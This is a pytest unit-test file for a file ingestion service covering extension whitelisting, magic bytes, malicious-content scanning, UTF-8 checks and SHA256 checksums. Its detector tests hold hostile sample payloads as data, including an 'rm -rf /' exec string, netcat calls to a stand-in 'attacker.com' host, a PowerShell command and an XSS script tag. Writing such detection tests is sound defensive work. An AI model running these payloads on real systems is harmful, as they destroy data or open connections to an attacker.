"""
Unit Tests for File Ingestion Service - SIMPLIFIED VERSION
Tests: File validation, malware detection, encoding verification
"""
import pytest

from services.ingestion_service import (
    validate_file_extension, check_magic_bytes, scan_for_malicious_content,
    enforce_utf8_encoding, compute_sha256, IngestionError
)


# ─────────────────────────────────────────────────────────────
# TESTS: File Extension Validation
# ─────────────────────────────────────────────────────────────

class TestFileExtensionValidation:
    """Test file extension whitelist validation."""
    
    def test_validate_csv_extension(self):
        """Verify .csv extension is allowed."""
        ext = validate_file_extension("data.csv")
        assert ext == ".csv"

    def test_validate_xlsx_extension(self):
        """Verify .xlsx extension is allowed."""
        ext = validate_file_extension("data.xlsx")
        assert ext == ".xlsx"

    def test_validate_json_extension(self):
        """Verify .json extension is allowed."""
        ext = validate_file_extension("data.json")
        assert ext == ".json"

    def test_validate_invalid_extension_exe(self):
        """Verify .exe is rejected."""
        with pytest.raises(IngestionError):
            validate_file_extension("malware.exe")

    def test_validate_invalid_extension_bat(self):
        """Verify .bat is rejected."""
        with pytest.raises(IngestionError):
            validate_file_extension("script.bat")

    def test_validate_invalid_extension_sh(self):
        """Verify .sh is rejected."""
        with pytest.raises(IngestionError):
            validate_file_extension("payload.sh")

    def test_validate_extension_case_insensitive(self):
        """Verify extension check is case-insensitive."""
        ext = validate_file_extension("data.CSV")
        assert ext.lower() == ".csv"

    def test_validate_path_traversal_rejected(self):
        """Verify path traversal attempts are blocked."""
        # Path traversal should be stripped
        ext = validate_file_extension("../../etc/passwd.csv")
        assert ext == ".csv"


# ─────────────────────────────────────────────────────────────
# TESTS: Magic Bytes Validation
# ─────────────────────────────────────────────────────────────

class TestMagicBytes:
    """Test file type validation using magic bytes."""
    
    def test_check_magic_bytes_valid_xlsx(self):
        """Verify valid XLSX (ZIP) magic bytes are accepted."""
        xlsx_bytes = b"PK\x03\x04" + b"x" * 100
        assert check_magic_bytes(xlsx_bytes, ".xlsx") is True

    def test_check_magic_bytes_invalid_xlsx(self):
        """Verify invalid XLSX magic bytes are rejected."""
        bad_bytes = b"\x00\x01\x02\x03" + b"x" * 100
        assert check_magic_bytes(bad_bytes, ".xlsx") is False

    def test_check_magic_bytes_csv_no_requirement(self):
        """Verify CSV files don't require magic bytes."""
        csv_bytes = b"Name,Age,Salary\nJohn,30,50000"
        assert check_magic_bytes(csv_bytes, ".csv") is True

    def test_check_magic_bytes_json_no_requirement(self):
        """Verify JSON files don't require magic bytes."""
        json_bytes = b'{"name": "John", "age": 30}'
        assert check_magic_bytes(json_bytes, ".json") is True


# ─────────────────────────────────────────────────────────────
# TESTS: Malicious Content Detection
# ─────────────────────────────────────────────────────────────

class TestMaliciousContentDetection:
    """Test detection of malicious code patterns."""
    
    def test_scan_detects_exec_payload(self):
        """Verify exec() patterns are detected."""
        malicious = b"Name,Age\nexec(__import__('os').system('rm -rf /'))"
        is_malicious, msg = scan_for_malicious_content(malicious)
        assert is_malicious is True

    def test_scan_detects_import_payload(self):
        """Verify __import__ patterns are detected."""
        malicious = b"__import__('subprocess').call(['nc', 'attacker.com'])"
        is_malicious, msg = scan_for_malicious_content(malicious)
        assert is_malicious is True

    def test_scan_detects_powershell_payload(self):
        """Verify PowerShell commands are detected."""
        malicious = b"Data\npowershell.exe -Command Get-Process"
        is_malicious, msg = scan_for_malicious_content(malicious)
        assert is_malicious is True

    def test_scan_detects_xss_payload(self):
        """Verify XSS payloads are detected."""
        malicious = b"<script>alert('xss')</script>"
        is_malicious, msg = scan_for_malicious_content(malicious)
        assert is_malicious is True

    def test_scan_detects_subprocess(self):
        """Verify subprocess calls are detected."""
        malicious = b"subprocess.Popen(['nc', 'attacker.com', '1234'])"
        is_malicious, msg = scan_for_malicious_content(malicious)
        assert is_malicious is True

    def test_scan_clean_csv_passes(self):
        """Verify clean CSV data passes scan."""
        clean_data = b"Name,Age,Salary\nAlice,28,60000\nBob,35,75000"
        is_malicious, msg = scan_for_malicious_content(clean_data)
        assert is_malicious is False

    def test_scan_clean_json_passes(self):
        """Verify clean JSON data passes scan."""
        clean_data = b'[{"id": 1, "name": "Alice"}, {"id": 2, "name": "Bob"}]'
        is_malicious, msg = scan_for_malicious_content(clean_data)
        assert is_malicious is False


# ─────────────────────────────────────────────────────────────
# TESTS: UTF-8 Encoding Validation
# ─────────────────────────────────────────────────────────────

class TestEncodingValidation:
    """Test UTF-8 encoding verification."""
    
    def test_enforce_utf8_valid_csv(self):
        """Verify valid UTF-8 CSV is accepted."""
        utf8_data = "Name,Age\nJosé,30\nFrançois,25".encode("utf-8")
        encoding = enforce_utf8_encoding(utf8_data, ".csv")
        assert encoding == "utf-8"

    def test_enforce_utf8_with_bom(self):
        """Verify UTF-8 with BOM is accepted."""
        utf8_bom_data = b"\xef\xbb\xbf" + "Name,Age\nJohn,30".encode("utf-8")
        encoding = enforce_utf8_encoding(utf8_bom_data, ".csv")
        assert encoding == "utf-8"

    def test_enforce_utf8_xlsx_binary(self):
        """Verify XLSX binary files bypass UTF-8 check."""
        xlsx_data = b"PK\x03\x04" + b"binary content"
        encoding = enforce_utf8_encoding(xlsx_data, ".xlsx")
        # XLSX returns utf-8 by default (it handles binary internally)
        assert encoding == "utf-8"


# ─────────────────────────────────────────────────────────────
# TESTS: SHA256 Checksum
# ─────────────────────────────────────────────────────────────

class TestChecksum:
    """Test SHA256 checksum generation."""
    
    def test_compute_sha256_length(self):
        """Verify SHA256 produces 64-character hex string."""
        data = b"test data"
        checksum = compute_sha256(data)
        assert len(checksum) == 64
        assert checksum.isalnum()

    def test_sha256_consistent(self):
        """Verify same data produces same checksum."""
        data = b"test data"
        checksum1 = compute_sha256(data)
        checksum2 = compute_sha256(data)
        assert checksum1 == checksum2

    def test_sha256_different_for_different_data(self):
        """Verify different data produces different checksums."""
        data1 = b"test data 1"
        data2 = b"test data 2"
        checksum1 = compute_sha256(data1)
        checksum2 = compute_sha256(data2)
        assert checksum1 != checksum2

    def test_sha256_hex_format(self):
        """Verify checksum is valid hex."""
        data = b"test"
        checksum = compute_sha256(data)
        # Should be valid hex characters
        try:
            int(checksum, 16)
            assert True
        except ValueError:
            assert False


# ─────────────────────────────────────────────────────────────
# INTEGRATION TESTS: Multi-layer Validation
# ─────────────────────────────────────────────────────────────

class TestMultiLayerValidation:
    """Test complete validation pipeline."""
    
    def test_complete_validation_flow_valid_csv(self):
        """Test: Extension → Magic bytes → Malware → Encoding → Checksum."""
        csv_content = "Name,Age,Salary\nAlice,28,60000\nBob,35,75000"
        data = csv_content.encode("utf-8")

        # Step 1: Extension validation
        ext = validate_file_extension("sales_data.csv")
        assert ext == ".csv"

        # Step 2: Magic bytes check
        assert check_magic_bytes(data, ".csv") is True

        # Step 3: Malicious content scan
        is_malicious, _ = scan_for_malicious_content(data)
        assert is_malicious is False

        # Step 4: Encoding check
        encoding = enforce_utf8_encoding(data, ".csv")
        assert encoding == "utf-8"

        # Step 5: Checksum
        checksum = compute_sha256(data)
        assert len(checksum) == 64

    def test_validation_rejects_malicious_csv(self):
        """Test that malicious content is detected even in CSV."""
        fake_csv = b"Name,Age\nexec(__import__('os').system('malicious'))"
        
        ext = validate_file_extension("data.csv")
        is_malicious, _ = scan_for_malicious_content(fake_csv)
        
        assert ext == ".csv"
        assert is_malicious is True

    def test_validation_rejects_wrong_extension(self):
        """Test that disallowed extensions are rejected."""
        with pytest.raises(IngestionError):
            validate_file_extension("payload.exe")

        with pytest.raises(IngestionError):
            validate_file_extension("script.bat")

        with pytest.raises(IngestionError):
            validate_file_extension("backdoor.sh")


# ─────────────────────────────────────────────────────────────
# EDGE CASES
# ─────────────────────────────────────────────────────────────

class TestEdgeCases:
    """Test edge cases and boundary conditions."""
    
    def test_empty_file_scan(self):
        """Verify empty file is handled."""
        empty_data = b""
        is_malicious, msg = scan_for_malicious_content(empty_data)
        assert is_malicious is False

    def test_very_large_filename(self):
        """Verify very long filenames are handled."""
        long_name = "a" * 200 + ".csv"
        ext = validate_file_extension(long_name)
        assert ext == ".csv"

    def test_special_characters_in_filename(self):
        """Verify special characters in filename are handled."""
        filename = "data-file_2024.01.25.csv"
        ext = validate_file_extension(filename)
        assert ext == ".csv"

    def test_unicode_in_filename(self):
        """Verify unicode characters in filename are handled."""
        filename = "données_2024.csv"  # French: "data"
        ext = validate_file_extension(filename)
        assert ext == ".csv"
